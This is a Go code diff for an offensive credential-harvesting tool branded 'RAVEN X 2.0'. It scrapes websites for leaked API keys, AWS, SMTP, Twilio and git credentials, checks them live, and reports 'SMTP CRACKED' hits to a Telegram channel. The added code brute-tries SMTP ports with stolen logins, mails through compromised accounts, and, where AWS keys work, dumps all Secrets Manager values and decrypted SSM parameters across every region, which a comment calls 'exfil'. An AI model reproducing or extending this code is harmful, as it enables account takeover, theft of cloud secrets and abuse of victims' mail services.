+		{a.HuggingFaceAPIKeyPattern, a.Config.APIValidation.HuggingFace || a.Config.APIValidation.AIAll, "HuggingFace", a.CheckHuggingFace},
+		{a.ReplicateAPIKeyPattern, a.Config.APIValidation.Replicate || a.Config.APIValidation.AIAll, "Replicate", a.CheckReplicate},
+		{a.CohereAPIKeyPattern, a.Config.APIValidation.Cohere || a.Config.APIValidation.AIAll, "Cohere", a.CheckCohere},
+		{a.TogetherAIAPIKeyPattern, a.Config.APIValidation.TogetherAI || a.Config.APIValidation.AIAll, "TogetherAI", a.CheckTogetherAI},
+		{a.FireworksAPIKeyPattern, a.Config.APIValidation.Fireworks || a.Config.APIValidation.AIAll, "Fireworks", a.CheckFireworks},
+		// Wave-9: Extended email providers
+		{a.MailchimpAPIKeyPattern, a.Config.APIValidation.Mailchimp, "Mailchimp", a.CheckMailchimp},
+		{mailchimpContextAPIKeyPattern, a.Config.APIValidation.Mailchimp, "Mailchimp", a.CheckMailchimp},
+		{a.ResendAPIKeyPattern, a.Config.APIValidation.Resend, "Resend", a.CheckResend},
+		// Wave-10: Git hosting platforms
+		{a.GitLabTokenPattern, a.Config.APIValidation.GitLab, "GitLab", a.CheckGitLab},
+		{a.BitbucketAppPasswordPattern, a.Config.APIValidation.Bitbucket, "Bitbucket", a.CheckBitbucket},
+		{a.BitbucketContextPattern, a.Config.APIValidation.Bitbucket, "Bitbucket", a.CheckBitbucket},
 	}
 
 	var wg sync.WaitGroup
 	// Batasi concurrent API validations untuk semua checks
 	validationSem := make(chan struct{}, 50)
 
-	// Tencent need special handling (require access key + secret)
-	tencentKeys := unique(a.TencentAccessKeyPattern.FindAllString(contentToScan, -1))
-	for _, key := range tencentKeys {
-		if _, loaded := a.KnownKeys.LoadOrStore(key, true); !loaded {
-			a.logFound("Tencent", key, sourceURL)
-			wg.Add(1)
-			validationSem <- struct{}{}
-			go func(k, u string) {
-				defer wg.Done()
-				defer func() { <-validationSem }()
-				a.CheckTencent(k, u)
-			}(key, sourceURL)
+	// Tencent — pattern-matched AKID keys; CheckTencent validates only when flag is on.
+	if a.Config.APIValidation.Tencent {
+		tencentKeys := unique(a.TencentAccessKeyPattern.FindAllString(contentToScan, -1))
+		for _, key := range tencentKeys {
+			if _, loaded := a.KnownKeys.LoadOrStore(key, true); !loaded {
+				a.logFound("Tencent", key, sourceURL)
+				wg.Add(1)
+				validationSem <- struct{}{}
+				go func(k, u string) {
+					defer wg.Done()
+					defer func() { <-validationSem }()
+					a.CheckTencent(k, u)
+				}(key, sourceURL)
+			}
 		}
 	}
 
 	// Aliyun scanning disabled
 
 	for _, check := range apiChecks {
-		if check.Feature { // Hanya jalankan jika diaktifkan di APIValidation
-			keys := unique(check.Pattern.FindAllString(contentToScan, -1))
-			for _, key := range keys {
+		if check.Feature {
+			// Use FindAllStringSubmatch so patterns with a capture group return
+			// only the captured value (group 1), not the full context-prefixed
+			// match. Patterns without a capture group fall back to m[0].
+			var rawKeys []string
+			for _, m := range check.Pattern.FindAllStringSubmatch(contentToScan, -1) {
+				if len(m) > 1 && m[1] != "" {
+					rawKeys = append(rawKeys, m[1])
+				} else if len(m) > 0 {
+					rawKeys = append(rawKeys, m[0])
+				}
+			}
+			// Derive a stable found-file name, e.g. "SendGrid" → "sendgrid_found.txt"
+			foundFile := strings.ToLower(strings.ReplaceAll(check.Name, " ", "_")) + "_found.txt"
+			for _, key := range unique(rawKeys) {
 				a.logFound(check.Name, key, sourceURL)
+				// Record the raw match before validation so credentials are never
+				// silently lost to timeouts or revoked-key failures.
+				a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), foundFile)
+				globalCounters.mu.Lock()
+				globalCounters.APIsFoundTotal++
+				globalCounters.mu.Unlock()
 				wg.Add(1)
 				validationSem <- struct{}{}
 				go func(k, url string, fn func(string, string) bool) {
@@ -3159,12 +3937,14 @@ func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
 		}
 	}
 
+	// nonValidatedChecks — pattern-only (no live API validator yet).
+	// Postmark and Mailjet are fully validated in apiChecks above; they are
+	// intentionally excluded here to avoid double-counting found files.
 	nonValidatedChecks := []struct {
 		Pattern *regexp.Regexp
 		Name    string
 	}{
-		{a.PostmarkAPIKeyPattern, "Postmark Server Token"},
-		{a.MailjetAPIKeyPattern, "Mailjet API Key"},
+		{a.NPMAuthTokenPattern, "NPM Auth Token"},
 	}
 
 	for _, check := range nonValidatedChecks {
@@ -3185,23 +3965,30 @@ func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
 		// Gabungkan semua potensi Access Key: AKIA (Standar) dan ASIA (SES/Federated/Temporary)
 		sesKeys := unique(a.AWSSESUserPattern.FindAllString(contentToScan, -1))
 		sks := unique(a.AWSSecretKeyPatternInfo.FindAllString(contentToScan, -1))
-		sessionTokens := unique(a.AWSSessionTokenPattern.FindAllString(contentToScan, -1))
+		var rawTokens []string
+		for _, m := range a.AWSSessionTokenPattern.FindAllStringSubmatch(contentToScan, -1) {
+			if len(m) > 1 && m[1] != "" {
+				rawTokens = append(rawTokens, m[1])
+			}
+		}
+		sessionTokens := unique(rawTokens)
 
-		// 1. Validasi semua pasangan AK (AKIA/ASIA) dan SK
+		// 1. Validate all AK+SK pairs (both AKIA long-lived and ASIA temporary).
+		// ASIA keys without a session token will fail STS and land in
+		// aws_ses_potential_unverified.txt — still recorded, not silently dropped.
+		// Loop 2 below also tries ASIA+SK+ST triplets when a session token is present.
 		for _, ak := range sesKeys {
 			for _, sk := range sks {
 				if len(sk) == 40 {
 					keyPair := fmt.Sprintf("%s:%s", ak, sk)
 
-					// Gunakan KnownKeys untuk mencegah API call ganda dari goroutine yang berbeda
 					if _, loaded := a.KnownKeys.LoadOrStore(keyPair, true); loaded {
 						continue
 					}
 
-					// Check for specific SES prefix to distinguish log output
-					name := "AWS (Standard/SES Potential)"
+					name := "AWS (AKIA Standard)"
 					if strings.HasPrefix(ak, "ASIA") {
-						name = "AWS (SES/Federated Potential)"
+						name = "AWS (ASIA Temporary/SES-Federated)"
 					}
 
 					a.logFound(name, keyPair, sourceURL)
@@ -3276,7 +4063,14 @@ func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
 	// Pengecekan Twilio menggunakan APIValidation
 	if a.Config.APIValidation.Twilio {
 		sids := unique(a.TwilioSIDPatternInfo.FindAllString(contentToScan, -1))
-		auths := unique(a.TwilioAuthPatternInfo.FindAllString(contentToScan, -1))
+		// Extract group 1 to strip surrounding quotes from auth tokens.
+		var rawAuths []string
+		for _, m := range a.TwilioAuthPatternInfo.FindAllStringSubmatch(contentToScan, -1) {
+			if len(m) > 1 && m[1] != "" && !strings.HasPrefix(m[1], "AC") {
+				rawAuths = append(rawAuths, m[1])
+			}
+		}
+		auths := unique(rawAuths)
 		encoded := unique(a.TwilioEncodePatternInfo.FindAllString(contentToScan, -1))
 		for _, enc := range encoded {
 			if dec, err := base64.StdEncoding.DecodeString(enc); err == nil {
@@ -3291,6 +4085,7 @@ func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
 		for _, sid := range sids {
 			for _, auth := range auths {
 				a.logFound("Twilio", fmt.Sprintf("%s:%s", sid, auth), sourceURL)
+				a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sanitizeSource(sourceURL), sid, auth), "twilio_found.txt")
 				wg.Add(1)
 				validationSem <- struct{}{}
 				go func(s, aT, u string) {
@@ -3324,6 +4119,7 @@ func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
 		for _, k := range unique(keys) {
 			for _, s := range unique(secrets) {
 				a.logFound("Nexmo", fmt.Sprintf("%s:%s", k, s), sourceURL)
+				a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sanitizeSource(sourceURL), k, s), "nexmo_found.txt")
 				wg.Add(1)
 				validationSem <- struct{}{}
 				go func(k, s, u string) {
@@ -3351,6 +4147,54 @@ func sanitizeSource(url string) string {
 	return strings.TrimPrefix(s, "http://")
 }
 
+func (a *AWSScanner) probeGraphQLIntrospection(baseURL string) {
+	payload := `{"query":"{__schema{types{name description}}}"}`
+	req, err := http.NewRequest("POST", baseURL, strings.NewReader(payload))
+	if err != nil {
+		return
+	}
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("User-Agent", nextUA())
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	defer cancel()
+	resp, err := client.Do(req.WithContext(ctx))
+	if err != nil || resp == nil {
+		return
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode == 200 {
+		body, _ := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
+		if strings.Contains(string(body), "__schema") || strings.Contains(string(body), "queryType") {
+			a.logFound("GraphQL", "Introspection enabled", baseURL)
+			a.saveIntoFile(fmt.Sprintf("%s:introspection_enabled", sanitizeSource(baseURL)), "graphql_found.txt")
+			a.checkAndSaveKeys(string(body), baseURL+" (GraphQL introspection)")
+		}
+	}
+}
+
+func (a *AWSScanner) extractGitCredentials(content, sourceURL string) {
+	// Extract credentials from git remote URLs: https://user:pass@host/repo
+	urlCredPat := regexp.MustCompile(`(?i)url\s*=\s*https?://([^:@\s]+):([^@\s]+)@([^\s/]+)`)
+	matches := urlCredPat.FindAllStringSubmatch(content, -1)
+	for _, m := range matches {
+		if len(m) >= 4 {
+			user, pass, host := m[1], m[2], m[3]
+			if len(pass) >= 8 {
+				cred := fmt.Sprintf("%s:%s@%s", user, pass, host)
+				if _, loaded := a.KnownKeys.LoadOrStore("gitcred:"+cred, true); !loaded {
+					a.logFound("Git Credentials", cred, sourceURL)
+					a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), cred), "git_credentials_found.txt")
+					globalCounters.mu.Lock()
+					globalCounters.APIsFoundTotal++
+					globalCounters.mu.Unlock()
+				}
+			}
+		}
+	}
+	// Also look for [credential] blocks with username/password
+	a.checkAndSaveKeys(content, sourceURL)
+}
+
 func (a *AWSScanner) ExploitReact2Shell(targetURL, sourceURL string) {
 	payloads := []string{
 		"/api/config",
@@ -3365,6 +4209,16 @@ func (a *AWSScanner) ExploitReact2Shell(targetURL, sourceURL string) {
 		"/build/static/js/bundle.js",
 		"/static/js/main.js",
 		"/static/js/bundle.js",
+		"/_next/static/chunks/pages/_app.js",
+		"/_next/static/chunks/main.js",
+		"/_nuxt/config.js",
+		"/static/js/main.chunk.js",
+		"/static/js/bundle.js",
+		"/runtime-main.js",
+		"/precache-manifest.js",
+		"/service-worker.js",
+		"/asset-manifest.json",
+		"/manifest.json",
 	}
 
 	foundCount := 0
@@ -3381,7 +4235,7 @@ func (a *AWSScanner) ExploitReact2Shell(targetURL, sourceURL string) {
 		if err != nil {
 			continue
 		}
-		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+		req.Header.Set("User-Agent", nextUA())
 		req.Header.Set("Accept", "*/*")
 
 		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
@@ -3490,10 +4344,19 @@ func (a *AWSScanner) extractValidatorsFromCode(code, sourceURL string) {
 	smtpConfigs := a.extractSMTPFromMultipleFormats(code, sourceURL)
 
 	for _, config := range smtpConfigs {
-		// Validasi kelengkapan
-		if config["host"] == "" || config["port"] == "" ||
-			config["user"] == "" || config["pass"] == "" || config["from"] == "" {
+		// host + user + pass required; port and from are synthesised if absent
+		if config["host"] == "" || config["user"] == "" || config["pass"] == "" {
 			continue
+		}
+		if config["port"] == "" {
+			config["port"] = "587"
+		}
+		if config["from"] == "" {
+			if strings.Contains(config["user"], "@") {
+				config["from"] = config["user"]
+			} else {
+				config["from"] = config["user"] + "@" + config["host"]
+			}
 		}
 
 		host := config["host"]
@@ -3612,12 +4475,104 @@ func (a *AWSScanner) extractSMTPFromMultipleFormats(code, sourceURL string) []ma
 	// Format 4: XML/Properties - SAFE untuk semua file
 	configs = append(configs, a.extractSMTPFromXML(code)...)
 
-	// Format 5: Proximity-based extraction - SKIP untuk JS files (terlalu banyak false positives)
-	// Proximity matching tidak cocok untuk JS karena syntax yang kompleks
+	// Format 5: Proximity-based extraction - SKIP untuk JS files
 	if !isJSFile {
 		configs = append(configs, a.extractSMTPByProximity(code)...)
 	}
 
+	// Format 6: WordPress wp-config.php
+	if !isJSFile {
+		configs = append(configs, a.extractSMTPFromWPConfig(code)...)
+	}
+
+	// Format 7: Docker Compose YAML
+	if !isJSFile {
+		configs = append(configs, a.extractSMTPFromDockerCompose(code)...)
+	}
+
+	// Format 8: Spring Boot application.properties / .yml
+	configs = append(configs, a.extractSMTPFromSpringBoot(code)...)
+
+	return configs
+}
+
+// extractSMTPFromWPConfig extracts SMTP/mail settings from wp-config.php format.
+// Also extracts any raw API keys embedded as WordPress constants.
+func (a *AWSScanner) extractSMTPFromWPConfig(code string) []map[string]string {
+	configs := []map[string]string{}
+	config := make(map[string]string)
+
+	// WordPress define('KEY', 'value') pattern
+	defineRe := regexp.MustCompile(`define\s*\(\s*['"]([^'"]+)['"]\s*,\s*['"]([^'"]+)['"]\s*\)`)
+	for _, m := range defineRe.FindAllStringSubmatch(code, -1) {
+		key := strings.ToUpper(m[1])
+		val := m[2]
+		switch key {
+		case "SMTP_HOST", "MAIL_HOST", "MAILER_HOST", "WP_SMTP_HOST":
+			config["host"] = val
+		case "SMTP_PORT", "MAIL_PORT", "WP_SMTP_PORT":
+			config["port"] = val
+		case "SMTP_USER", "SMTP_USERNAME", "MAIL_USERNAME", "WP_SMTP_USER":
+			config["user"] = val
+		case "SMTP_PASS", "SMTP_PASSWORD", "MAIL_PASSWORD", "WP_SMTP_PASS":
+			config["pass"] = val
+		case "SMTP_FROM", "MAIL_FROM", "MAIL_FROM_ADDRESS", "WP_SMTP_FROM":
+			config["from"] = val
+		}
+	}
+
+	if config["host"] != "" && config["user"] != "" && config["pass"] != "" {
+		if config["port"] == "" {
+			config["port"] = "587"
+		}
+		if config["from"] == "" {
+			config["from"] = config["user"]
+		}
+		configs = append(configs, config)
+	}
+	return configs
+}
+
+// extractSMTPFromDockerCompose extracts SMTP credentials from docker-compose.yml environment blocks.
+func (a *AWSScanner) extractSMTPFromDockerCompose(code string) []map[string]string {
+	// Treat each line as a potential env var assignment (YAML or .env style inside compose)
+	return (&AWSScanner{
+		SMTPHostPattern: regexp.MustCompile(`(?i)(?:MAIL_HOST|SMTP_HOST|EMAIL_HOST|MAILER_HOST)\s*[=:]\s*["']?([a-zA-Z0-9.\-]+)["']?`),
+		SMTPPortPattern: regexp.MustCompile(`(?i)(?:MAIL_PORT|SMTP_PORT|EMAIL_PORT)\s*[=:]\s*["']?(\d+)["']?`),
+		SMTPUserPattern: regexp.MustCompile(`(?i)(?:MAIL_USERNAME|SMTP_USER(?:NAME)?|EMAIL_USER(?:NAME)?)\s*[=:]\s*["']?([^"'\s]+)["']?`),
+		SMTPPassPattern: regexp.MustCompile(`(?i)(?:MAIL_PASSWORD|SMTP_PASS(?:WORD)?|EMAIL_PASS(?:WORD)?)\s*[=:]\s*["']?([^"'\s]+)["']?`),
+		SMTPFromPattern: regexp.MustCompile(`(?i)(?:MAIL_FROM(?:_ADDRESS)?|SMTP_FROM)\s*[=:]\s*["']?([^\s"']+@[^\s"']+)["']?`),
+	}).extractSMTPFromEnv(code)
+}
+
+// extractSMTPFromSpringBoot extracts SMTP settings from Spring Boot properties/YAML format.
+// Covers: spring.mail.host, spring.mail.username, spring.mail.password, etc.
+func (a *AWSScanner) extractSMTPFromSpringBoot(code string) []map[string]string {
+	configs := []map[string]string{}
+	config := make(map[string]string)
+
+	patterns := map[string]*regexp.Regexp{
+		"host": regexp.MustCompile(`(?i)spring\.mail\.host\s*[=:]\s*([^\s\n]+)`),
+		"port": regexp.MustCompile(`(?i)spring\.mail\.port\s*[=:]\s*(\d+)`),
+		"user": regexp.MustCompile(`(?i)spring\.mail\.username\s*[=:]\s*([^\s\n]+)`),
+		"pass": regexp.MustCompile(`(?i)spring\.mail\.password\s*[=:]\s*([^\s\n]+)`),
+	}
+
+	for field, re := range patterns {
+		if m := re.FindStringSubmatch(code); len(m) > 1 {
+			config[field] = strings.Trim(m[1], `"' `)
+		}
+	}
+
+	if config["host"] != "" && config["user"] != "" && config["pass"] != "" {
+		if config["port"] == "" {
+			config["port"] = "587"
+		}
+		if config["from"] == "" {
+			config["from"] = config["user"]
+		}
+		configs = append(configs, config)
+	}
 	return configs
 }
 
@@ -3680,29 +4635,40 @@ func (a *AWSScanner) extractSMTPFromEnv(code string) []map[string]string {
 	for _, line := range lines {
 		line = strings.TrimSpace(line)
 
-		// MAIL_HOST atau SMTP_HOST
-		if match := regexp.MustCompile(`(?i)(?:MAIL_HOST|SMTP_HOST)\s*=\s*["']?([^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
+		// Host — covers MAIL_HOST, SMTP_HOST, EMAIL_HOST, MAILER_HOST, DB_EMAIL_HOST, etc.
+		if match := regexp.MustCompile(`(?i)(?:MAIL_HOST|SMTP_HOST|EMAIL_HOST|MAILER_HOST|EMAIL_SERVER|SMTP_SERVER)\s*[=:]\s*["']?([a-zA-Z0-9.\-]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
 			config["host"] = strings.Trim(match[1], `"'`)
 		}
-		// MAIL_PORT atau SMTP_PORT
-		if match := regexp.MustCompile(`(?i)(?:MAIL_PORT|SMTP_PORT)\s*=\s*["']?(\d+)["']?`).FindStringSubmatch(line); len(match) > 1 {
+		// Port
+		if match := regexp.MustCompile(`(?i)(?:MAIL_PORT|SMTP_PORT|EMAIL_PORT|MAILER_PORT)\s*[=:]\s*["']?(\d+)["']?`).FindStringSubmatch(line); len(match) > 1 {
 			config["port"] = match[1]
 		}
-		// MAIL_USERNAME atau SMTP_USER
-		if match := regexp.MustCompile(`(?i)(?:MAIL_USERNAME|SMTP_USER|SMTP_USERNAME)\s*=\s*["']?([^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
+		// User / username
+		if match := regexp.MustCompile(`(?i)(?:MAIL_USERNAME|SMTP_USER(?:NAME)?|EMAIL_USERNAME|MAILER_USER(?:NAME)?|EMAIL_USER)\s*[=:]\s*["']?([^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
 			config["user"] = strings.Trim(match[1], `"'`)
 		}
-		// MAIL_PASSWORD atau SMTP_PASS
-		if match := regexp.MustCompile(`(?i)(?:MAIL_PASSWORD|SMTP_PASS|SMTP_PASSWORD)\s*=\s*["']?([^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
+		// Password
+		if match := regexp.MustCompile(`(?i)(?:MAIL_PASSWORD|SMTP_PASS(?:WORD)?|EMAIL_PASS(?:WORD)?|MAILER_PASS(?:WORD)?|EMAIL_SECRET)\s*[=:]\s*["']?([^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
 			config["pass"] = strings.Trim(match[1], `"'`)
 		}
-		// MAIL_FROM
-		if match := regexp.MustCompile(`(?i)(?:MAIL_FROM|MAIL_FROM_ADDRESS|SMTP_FROM)\s*=\s*["']?([^"'\s]+@[^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
+		// From address (optional — synthesised from user if absent)
+		if match := regexp.MustCompile(`(?i)(?:MAIL_FROM(?:_ADDRESS)?|SMTP_FROM|EMAIL_FROM|MAILER_FROM|MAIL_SENDER)\s*[=:]\s*["']?([^"'\s]+@[^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
 			config["from"] = strings.Trim(match[1], `"'`)
 		}
 	}
 
-	if len(config) >= 5 {
+	// Only host+user+pass are required; port defaults to 587, from synthesises from user.
+	if config["host"] != "" && config["user"] != "" && config["pass"] != "" {
+		if config["port"] == "" {
+			config["port"] = "587"
+		}
+		if config["from"] == "" {
+			if strings.Contains(config["user"], "@") {
+				config["from"] = config["user"]
+			} else {
+				config["from"] = config["user"] + "@" + config["host"]
+			}
+		}
 		configs = append(configs, config)
 	}
 
@@ -3859,32 +4825,88 @@ func (a *AWSScanner) extractSMTPByProximity(code string) []map[string]string {
 }
 
 // testSMTPConnection test koneksi SMTP yang ditemukan
-func (a *AWSScanner) testSMTPConnection(host, port, user, pass, from, sourceURL string) {
-	addr := fmt.Sprintf("%s:%s", host, port)
-	auth := smtp.PlainAuth("", user, pass, host)
-	msg := fmt.Sprintf("From: %s\r\nTo: %s\r\nSubject: Raven X Test\r\n\r\nTest Email.", from, a.Config.SMTPTestEmail)
+// validateSMTPCredentials verifies SMTP credentials using an AUTH-only handshake
+// (no test email required). Tries AUTH PLAIN then AUTH LOGIN on each port in order.
+// Falls back across ports: primary → 587 → 465 → 25 → 2525.
+// Returns true and writes to smtp_valid.txt on first successful auth.
+func (a *AWSScanner) validateSMTPCredentials(host, port, user, pass, from, sourceURL string) bool {
+	if from == "" {
+		if strings.Contains(user, "@") {
+			from = user
+		} else {
+			from = user + "@" + host
+		}
+	}
 
-	timeout := 15 * time.Second
-	done := make(chan error, 1)
+	// Port fallback sequence — always try the configured port first.
+	ports := []string{port}
+	for _, p := range []string{"587", "465", "25", "2525"} {
+		if p != port {
+			ports = append(ports, p)
+		}
+	}
 
-	go func() {
-		done <- smtp.SendMail(addr, auth, from, []string{a.Config.SMTPTestEmail}, []byte(msg))
-	}()
+	smtpLine := fmt.Sprintf("%s:%s:%s:%s:%s", host, port, user, pass, from)
 
-	select {
-	case err := <-done:
-		if err == nil {
-			smtpLine := fmt.Sprintf("%s:%s:%s:%s:%s", host, port, user, pass, from)
-			a.logValid("SMTP (AST)", smtpLine)
-			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), smtpLine), "smtp_valid.txt")
+	for _, tryPort := range ports {
+		addr := fmt.Sprintf("%s:%s", host, tryPort)
+		tryPort_ := tryPort
 
-			globalCounters.mu.Lock()
-			globalCounters.ValidSMTP++
-			globalCounters.mu.Unlock()
+		result := make(chan bool, 1)
+		go func() {
+			// Port 465 uses implicit TLS (SMTPS); all others try STARTTLS via PlainAuth.
+			var err error
+			if tryPort_ == "465" {
+				tlsCfg := &tls.Config{ServerName: host, InsecureSkipVerify: true}
+				conn, e := tls.DialWithDialer(&net.Dialer{Timeout: 10 * time.Second}, "tcp", addr, tlsCfg)
+				if e != nil {
+					result <- false
+					return
+				}
+				c, e := smtp.NewClient(conn, host)
+				if e != nil {
+					conn.Close()
+					result <- false
+					return
+				}
+				defer c.Quit()
+				// Try PLAIN then LOGIN
+				err = c.Auth(smtp.PlainAuth("", user, pass, host))
+				if err != nil {
+					err = c.Auth(LoginAuth(user, pass))
+				}
+			} else {
+				c, e := smtp.Dial(addr)
+				if e != nil {
+					result <- false
+					return
+				}
+				defer c.Quit()
+				// Upgrade to TLS if offered (STARTTLS)
+				if ok, _ := c.Extension("STARTTLS"); ok {
+					if e := c.StartTLS(&tls.Config{ServerName: host, InsecureSkipVerify: true}); e != nil {
+						// Continue without TLS
+					}
+				}
+				err = c.Auth(smtp.PlainAuth("", user, pass, host))
+				if err != nil {
+					err = c.Auth(LoginAuth(user, pass))
+				}
+			}
+			result <- (err == nil)
+		}()
 
-			tlgMsg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
+		select {
+		case ok := <-result:
+			if ok {
+				a.logValid("SMTP", smtpLine)
+				a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), smtpLine), "smtp_valid.txt")
+				globalCounters.mu.Lock()
+				globalCounters.ValidSMTP++
+				globalCounters.mu.Unlock()
+				tlgMsg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
 ━━━━━━━━━━━━━━━━━━
-📨 <b>SMTP CRACKED (AST)</b>
+📨 <b>SMTP CRACKED</b>
 
 🖥️ <b>Host:</b> <code>%s</code>
 🔌 <b>Port:</b> <code>%s</code>
@@ -3892,12 +4914,125 @@ func (a *AWSScanner) testSMTPConnection(host, port, user, pass, from, sourceURL 
 🔑 <b>Pass:</b> <code>%s</code>
 📧 <b>From:</b> %s
 🔗 <b>Source:</b> %s
-`, host, port, user, pass, from, sourceURL)
-			go a.sendTelegram(tlgMsg)
-			a.storeValidKeyLimit("SMTP", host, "Email Sent (AST)")
+`, host, tryPort, user, pass, from, sourceURL)
+				go a.sendTelegram(tlgMsg)
+				a.storeValidKeyLimit("SMTP", host, fmt.Sprintf("Auth OK port %s", tryPort))
+
+				// If test email configured, also send an actual email.
+				if a.Config.SMTPTestEmail != "" {
+					go func() {
+						auth := smtp.PlainAuth("", user, pass, host)
+						msg := fmt.Sprintf("From: %s\r\nTo: %s\r\nSubject: RavenX Hit\r\n\r\nSMTP confirmed: %s", from, a.Config.SMTPTestEmail, host)
+						smtp.SendMail(fmt.Sprintf("%s:%s", host, tryPort), auth, from, []string{a.Config.SMTPTestEmail}, []byte(msg)) //nolint
+					}()
+				}
+				return true
+			}
+		case <-time.After(12 * time.Second):
+			pterm.Debug.Printfln("[SMTP TIMEOUT] %s:%s", host, tryPort)
 		}
-	case <-time.After(timeout):
-		pterm.Debug.Printfln("[SMTP TIMEOUT] %s: Operation timed out after %v", host, timeout)
+	}
+	return false
+}
+
+// LoginAuth implements the SMTP AUTH LOGIN mechanism (distinct from AUTH PLAIN).
+// Many hosts require LOGIN instead of PLAIN (e.g. Office 365, some cPanel hosts).
+type loginAuth struct{ username, password string }
+
+func LoginAuth(username, password string) smtp.Auth { return &loginAuth{username, password} }
+func (a *loginAuth) Start(*smtp.ServerInfo) (string, []byte, error) {
+	return "LOGIN", []byte(a.username), nil
+}
+func (a *loginAuth) Next(fromServer []byte, more bool) ([]byte, error) {
+	if more {
+		switch strings.ToLower(strings.TrimSpace(string(fromServer))) {
+		case "username:":
+			return []byte(a.username), nil
+		case "password:":
+			return []byte(a.password), nil
+		}
+		return []byte(a.password), nil
+	}
+	return nil, nil
+}
+
+func (a *AWSScanner) testSMTPConnection(host, port, user, pass, from, sourceURL string) {
+	a.validateSMTPCredentials(host, port, user, pass, from, sourceURL)
+}
+
+// awsRegions is the full 19-region list from the aws.py harvester reference.
+var awsRegions = []string{
+	"us-east-1", "us-east-2", "us-west-1", "us-west-2",
+	"eu-west-1", "eu-west-2", "eu-west-3", "eu-central-1", "eu-north-1",
+	"ap-northeast-1", "ap-northeast-2", "ap-northeast-3",
+	"ap-southeast-1", "ap-southeast-2", "ap-south-1",
+	"sa-east-1", "ca-central-1", "us-gov-east-1", "us-gov-west-1",
+}
+
+// scanSecretsManager lists and retrieves all secrets across every region.
+// Results are written to aws_secrets.txt — one line per secret value.
+func (a *AWSScanner) scanSecretsManager(baseCfg aws.Config, ak, sk, sourceURL string) {
+	for _, region := range awsRegions {
+		regionCfg := baseCfg.Copy()
+		regionCfg.Region = region
+		svc := secretsmanager.NewFromConfig(regionCfg)
+
+		ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
+		list, err := svc.ListSecrets(ctx, &secretsmanager.ListSecretsInput{})
+		cancel()
+		if err != nil || list == nil {
+			continue
+		}
+
+		for _, s := range list.SecretList {
+			name := aws.ToString(s.Name)
+			ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
+			val, err := svc.GetSecretValue(ctx2, &secretsmanager.GetSecretValueInput{SecretId: s.Name})
+			cancel2()
+			if err != nil || val == nil {
+				a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s", sanitizeSource(sourceURL), ak, region, name), "aws_secrets.txt")
+				continue
+			}
+			secret := aws.ToString(val.SecretString)
+			if secret == "" && val.SecretBinary != nil {
+				secret = fmt.Sprintf("[binary %d bytes]", len(val.SecretBinary))
+			}
+			a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s=%s", sanitizeSource(sourceURL), ak, region, name, secret), "aws_secrets.txt")
+			pterm.Warning.Printfln("[SECRETS MANAGER] %s / %s", region, name)
+		}
+	}
+}
+
+// scanSSMParameters dumps all SSM Parameter Store values (with decryption) across every region.
+func (a *AWSScanner) scanSSMParameters(baseCfg aws.Config, ak, sk, sourceURL string) {
+	for _, region := range awsRegions {
+		regionCfg := baseCfg.Copy()
+		regionCfg.Region = region
+		svc := ssm.NewFromConfig(regionCfg)
+
+		ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
+		desc, err := svc.DescribeParameters(ctx, &ssm.DescribeParametersInput{})
+		cancel()
+		if err != nil || desc == nil {
+			continue
+		}
+
+		for _, p := range desc.Parameters {
+			name := aws.ToString(p.Name)
+			ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
+			withDecryption := true
+			val, err := svc.GetParameter(ctx2, &ssm.GetParameterInput{
+				Name:           p.Name,
+				WithDecryption: &withDecryption,
+			})
+			cancel2()
+			if err != nil || val == nil || val.Parameter == nil {
+				continue
+			}
+			value := aws.ToString(val.Parameter.Value)
+			a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s=%s", sanitizeSource(sourceURL), ak, region, name, value), "aws_ssm.txt")
+			pterm.Warning.Printfln("[SSM] %s / %s", region, name)
+		}
 	}
 }
 
@@ -3921,6 +5056,11 @@ func (a *AWSScanner) handleValidAWS(ak, sk, st, sourceURL string, identity *sts.
 	snsInfo := a.checkSNSLimitAllRegions(cfg)
 	fargateInfo := a.checkFargateOnDemandLimitAllRegions(cfg)
 	fedInfo := a.getFederationConsoleURL(cfg, identity, 43200)
+
+	// Secrets Manager + SSM Parameter Store — run in background so the
+	// Telegram report fires immediately while exfil continues.
+	go a.scanSecretsManager(cfg, ak, sk, sourceURL)
+	go a.scanSSMParameters(cfg, ak, sk, sourceURL)
 
 	// Coba kirim email via AWS SES
 	emailResult := a.SendEmailViaAWS(cfg, ak, sk, sourceURL)
@@ -4063,13 +5203,25 @@ func (a *AWSScanner) createRequest(domain string) {
 	}
 	domain = strings.TrimRight(domain, "/")
 
